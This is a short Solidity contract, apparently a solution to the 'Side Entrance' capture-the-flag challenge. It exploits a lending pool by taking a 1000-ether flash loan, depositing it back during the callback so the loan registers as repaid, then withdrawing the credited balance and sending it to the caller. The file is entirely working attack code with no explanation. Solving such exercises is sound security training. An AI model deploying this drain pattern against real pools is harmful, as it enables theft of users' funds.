// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface SideEntranceInterface{
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract AttackContractSideEntrance {

    address public immutable target;
    uint256 public constant poolAmount = 1000 ether;

    constructor(address _target){
        target = _target;
    }

    function initiateAttack() external {
        SideEntranceInterface(target).flashLoan(poolAmount);
        SideEntranceInterface(target).withdraw();
        (bool success, bytes memory data) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external payable{
        SideEntranceInterface(target).deposit{value: msg.value}();
    }

    receive() external payable{}
}